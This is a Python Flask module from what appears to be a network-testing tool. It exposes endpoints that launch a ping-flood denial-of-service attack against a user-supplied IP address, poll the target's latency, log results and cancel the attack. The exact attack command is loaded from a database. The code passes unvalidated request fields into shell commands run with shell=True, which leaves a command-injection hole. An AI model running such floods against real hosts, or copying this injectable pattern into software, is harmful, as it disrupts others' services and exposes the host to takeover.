from flask import Blueprint, request
from utilities.databaseFunc import *
from utilities.utilities import *
import subprocess
import signal
import time
import os
import threading
import datetime

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

cancel_event = threading.Event() #  Global cancel event
latency_ping_list = []
pid = 0

def check_latency_periodically(ip_address, duration):
    global latency_ping_list
    command = getCommand("PING", "LATENCY")
    command = command.format(ipAddress=ip_address)
    start_time = datetime.datetime.now()
    duration = datetime.timedelta(seconds=duration)

    # poll for latency every 5 seconds
    while datetime.datetime.now() - start_time < duration:
        if cancel_event.is_set():
            return  # Exit early if the cancel event is set
        latency(command)
        time.sleep(5)


def latency(command):
    global latency_ping_list
    ping_process = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
    output, _ = ping_process.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    # append latency ping result to list
    if "time" in line:
        result = '[PING SUCCESS] ' + line
    else:
        result = '[PING FAILED] ' + line
    
    latency_ping_list.append(result)
    return result

def dos(command, duration):
    global latency_ping_list, pid
    start_time = datetime.datetime.now()
    duration = datetime.timedelta(seconds=duration)

    # carry out attack for specified duration
    dos_command = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, text=True, preexec_fn=os.setsid)
    pid = dos_command.pid

    while not cancel_event.is_set() and (datetime.datetime.now() - start_time) < duration:
        time.sleep(1)
    if not cancel_event.is_set():
        os.killpg(os.getpgid(dos_command.pid), signal.SIGTERM)

@dosAttack.post("/")
def DOSAttack():
    global latency_ping_list, cancel_event
    data = request.get_json()
    ip_address = data["ipAddress"]
    port_number = data["portNumber"]
    packet_size = data["packetSize"]
    attack_type = data["attackType"]
    duration = int(data["duration"])

    if isHostReachable(ip_address):
        # get dos command from database
        command = getCommand("DOS", "PINGFLOOD")
        command = command.format(
            attackType=attack_type,
            packetSize=packet_size,
            portNumber=port_number,
            ipAddress=ip_address)

        # create process for latency polling
        latency_check = threading.Thread(target=check_latency_periodically, args=(ip_address, duration))
        latency_check.start()

        # create process for dos attack
        attack = threading.Thread(target=dos, args=(command, duration))
        attack.start()

        # wait for processes to finish
        attack.join()
        latency_check.join()

        if not cancel_event.is_set():
            # collect results
            latency_ping_list_result = list(latency_ping_list)  # Copy the list to avoid shared memory issues

            # log dos attack details to database
            logActivityDOS("DOS ATTACK", data, latency_ping_list_result)

        # Clear the global list
        latency_ping_list.clear()
        cancel_event.clear()

        return ""
    else:
        return {}, 400

@dosAttack.post("/latency")
def checkLatency():
    global latency_ping_list
    if len(latency_ping_list) > 0:
        return latency_ping_list[-1]
    else:
        return ""

@dosAttack.get("/cancel")
def cancel_attack():
    global cancel_event, pid
    cancel_event.set()  # Set the cancel event
    os.killpg(os.getpgid(pid), signal.SIGTERM)
    return "Attack cancelled"
